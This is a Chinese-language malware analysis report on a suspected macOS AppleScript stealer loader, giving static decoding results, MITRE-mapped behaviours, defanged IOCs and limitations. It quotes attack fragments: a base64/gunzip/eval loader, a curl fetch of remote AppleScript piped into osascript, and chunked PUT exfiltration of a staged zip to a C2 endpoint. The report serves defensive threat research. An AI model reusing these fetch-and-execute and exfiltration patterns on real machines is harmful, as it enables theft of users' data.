---
title: "恶意样本分析：macOS AppleScript 窃密加载器(候选)（other · zsh · 93e784fd）"
published: 2026-10-29
draft: false
description: "恶意（置信度低）：macOS AppleScript 窃密加载器(候选) · stealer/loader/downloader · 难度 easy · 纯静态分析"
tags: ["stealer", "loader", "downloader", "Script"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **macOS AppleScript 窃密加载器(候选)**（存疑） · 置信度 **低**
> 
> 别名：Atomic macOS Stealer (AMOS) 同型、macOS osascript stealer/loader
> 
> 外层为 base64+gunzip+eval 的 zsh 加载器;静态解码后得到完整 2650 字节 stage2 脚本,其中硬编码 C2 域名与任务令牌,通过 curl 拉取远程 AppleScript 并交 osascript 执行,随后将 /tmp/osalogging.zip 按 10MB 分块 PUT 上传外传并删除临时文件。恶意意图与执行链均在解码后的代码中直接可见,无动态执行必要。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **macOS AppleScript 窃密加载器(候选)** · 别名 Atomic macOS Stealer (AMOS) 同型、macOS osascript stealer/loader · _存疑_ |
| 置信度 | **低** |
| 行为类 | stealer · loader · downloader |
| 难度 | easy |
| 首次出现 | 2026-10-29 08:25:49 |
| 分析方法 | 纯静态分析 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/93e784fdb589d9363643830cb1bac90ea71d62b1bbbe0cb65ef3d3d81961a7b5/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">解码内嵌载荷</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">静默后台运行</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1564.003</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">拉取远程脚本</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">执行C2下发脚本</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1059.002</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">分块外传打包数据</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1041</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `93e784fdb589d9363643830cb1bac90ea71d62b1bbbe0cb65ef3d3d81961a7b5` |
| MD5 | _未记录_ |
| 大小 | 1,450 字节（1.4 KB） |
| 类型 | other · `zsh` |

## 行为分析

共 **8** 条行为，每条都挂了证据，且全部静态可得。

### 1. 解码内嵌载荷

`T1140` · 置信度 **高** · 静态

外层 zsh 用 base64 -D 解码 heredoc 中的 gzip 数据,gunzip 后通过 eval 执行解出的第二个脚本,整个加载链自包含。

> **证据**：样本偏移 0x00B: d30185=$(base64 -D <<'PAYLOAD_m98372924415082' | gunzip;偏移 0x59B: eval "$d30185"
> 
> **来源**：`ev-000001` · `ev-000003`

### 2. 静默后台运行

`T1564.003` · 置信度 **高** · 静态

stage2 将 stdin/stdout/stderr 全部重定向到 /dev/null,并以 daemon_function "$@" & 后台启动,运行时无终端输出。

> **证据**：stage2 偏移 31/51/71: exec </dev/null、exec >/dev/null、exec 2>/dev/null;偏移 2590: if daemon_function "$@" &
> 
> **来源**：`ev-000002` · `ev-000003`

### 3. 拉取远程脚本

`T1105` · 置信度 **高** · 静态

以 HTTP GET 请求 hxxp://youthfulintelligence[.]com/dynamic?txd=<token> 获取远程 AppleScript,请求带 api-key: 5190ef1733183a0dc63fb623357f56d6 与伪造的 macOS Safari User-Agent。

> **证据**：stage2 偏移 505: "hxxp://$domain/dynamic?txd=$token&pwd=$1";偏移 370/616 UA 字符串;偏移 468/714 api-key 头
> 
> **来源**：`ev-000002` · `ev-000003`

### 4. 执行C2下发脚本

`T1059.002` · 置信度 **高** · 静态

curl 下载的响应体不经落盘,直接通过管道交给 osascript 解释执行,由 C2 动态下发后续 AppleScript 任务。

> **证据**：stage2 偏移 505 与 751: curl ... "hxxp://$domain/dynamic?..." | osascript
> 
> **来源**：`ev-000002` · `ev-000003`

### 5. 分块外传打包数据

`T1041` · 置信度 **高** · 静态

检查 /tmp/osalogging.zip 存在且非空后,用 dd 按 10MB 切片,逐片 curl -X PUT 上传至 /gate,携带 buildtxd/upload_id/chunk_index/total_chunks;每片最多重试 8 次,间隔递增。

> **证据**：stage2 偏移 938 CHUNK_SIZE=10MB、1669 dd if="$file"、1759 curl -k -s -X PUT、2073 /gate?buildtxd=$token&upload_id=...;偏移 2493 sleep 重试退避
> 
> **来源**：`ev-000002` · `ev-000003`

### 6. 删除临时数据包

`T1070.004` · 置信度 **高** · 静态

全部切片上传成功后执行 rm -f /tmp/osalogging.zip,清除暂存的外传数据。

> **证据**：stage2 偏移 2557: rm -f "$file"
> 
> **来源**：`ev-000002` · `ev-000003`

### 7. 回传口令参数

`T1041` · 置信度 **中** · 静态

若脚本带参数运行,将第一个参数 $1 作为 pwd 查询参数拼入任务请求发往 C2,参数值在 URL 中明文传输。

> **证据**：stage2 偏移 505: /dynamic?txd=$token&pwd=$1
> 
> **来源**：`ev-000002` · `ev-000003`

### 8. 任务令牌标识受害者

`T1071.001` · 置信度 **高** · 静态

硬编码 64 位十六进制 txd/buildtxd 令牌与 32 位 api-key,用于在 /dynamic 与 /gate 间关联同一受害者的任务与上传会话。

> **证据**：stage2 偏移 136 token=f2bf...d25c;偏移 219 api_key=5190...;uploads 使用 upload_id=$(date +%s)-<随机>
> 
> **来源**：`ev-000002` · `ev-000003`


## IOC（已去武器化）

### 网络

:::caution
**真实服务器侧仍未验证**：上述连接/握手是与本地受控 受控仿真服务 完成的，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://youthfulintelligence[.]com/dynamic?txd=f2bf008c663b1dc9f65367156664e523bd6bd3814f18f4499b465eb431eed25c` | 80 | c2 | 静态 | ⏳ 未观测 |
| http | `hxxp://youthfulintelligence[.]com/gate?buildtxd=f2bf008c663b1dc9f65367156664e523bd6bd3814f18f4499b465eb431eed25c` | 80 | exfil | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `/tmp/osalogging.zip`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `youthfulintelligence[.]com` | 是 | 静态 |
| `c2_protocol` | `http (明文,curl -k 忽略证书)` | 是 | 静态 |
| `c2_port` | `80` | 是 | 静态 |
| `task_endpoint` | `/dynamic?txd=<token>[&pwd=$1]` | 是 | 静态 |
| `exfil_endpoint` | `/gate?buildtxd=<token>&upload_id=..&chunk_index=..&total_chunks=..` | 是 | 静态 |
| `campaign_id` | `f2bf008c663b1dc9f65367156664e523bd6bd3814f18f4499b465eb431eed25c` | 是 | 静态 |
| `api_key` | `5190ef1733183a0dc63fb623357f56d6` | 是 | 静态 |
| `user_agent` | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36` | 是 | 静态 |
| `staging_path` | `/tmp/osalogging.zip` | 是 | 静态 |
| `upload_chunk_size` | `10485760 (10MB)` | 是 | 静态 |
| `upload_max_retries` | `8` | 是 | 静态 |
| `encryption_algo` | `none (HTTP 明文,无应用层加密)` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不能声称已在真实 macOS 环境引爆或实际观测到 C2 通信、数据窃取与上传成功:本次仅做静态解码与代码阅读,未执行样本。
- 不能断言域名 youthfulintelligence[.]com 当前存活、归属或解析地址;该值仅来自样本硬编码,未做任何外联验证。
- 不能断言 stage2 从 C2 拉取的 AppleScript 具体窃取对象(浏览器凭据、钥匙串、钱包等)或是否包含持久化逻辑,该内容未被获取。
- 不能仅凭 osascript + zip + 分块上传特征将样本确定归因到某个商业家族,家族仅能作为候选。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 纯静态分析 |
| 脱壳 | 是（stage2 `ca733ba743cb384befb7f62b9987a9e6fe76ad1ffb72dd98ec7040a392c558a7`） |

**局限与待验证**

1. 纯静态分析:未执行脚本,reproduced=false;所有网络、文件与执行行为均由解码后的代码推断,未经运行时确认。
2. C2 未接触:域名、令牌、api-key 与端点均来自硬编码,其存活状态、响应内容与真实上传结果未知,pending_dynamic_verify=true。
3. 未获取 /dynamic 返回的 AppleScript,因此实际窃取范围、是否落地持久化、是否提权均无法确认。
4. 家族归因不确定:样本不含家族专属字符串/配置结构,仅按 TTP 给出候选,confidence=low。
5. 同目录 ZIP 为 AES 加密且无口令,未能核验其中是否与 .zsh 完全一致(文件名与大小一致)。

## 证据索引

<details>
<summary>展开 3 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 字符串提取 | 外层 .zsh 的 ASCII 字符串:base64 heredoc、gunzip 管道、eval "$d30185",无明文 IOC。 |
| `ev-000002` | 字符串提取 | 解码出的 stage2 脚本字符串:domain=youthfulintelligence[.]com、token、api_key、/tmp/osalogging.zip、/dynamic 与 /gate 请求串、osascript 管道、分块 PUT 上传与 rm 清理。 |
| `ev-000003` | evidence.record (script) | Python 静态解码流程:base64 解码 heredoc → gunzip → 2650 字节 stage2(sha256 ca733b...),提取全部 IOC、偏移与行为链;未执行样本。 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
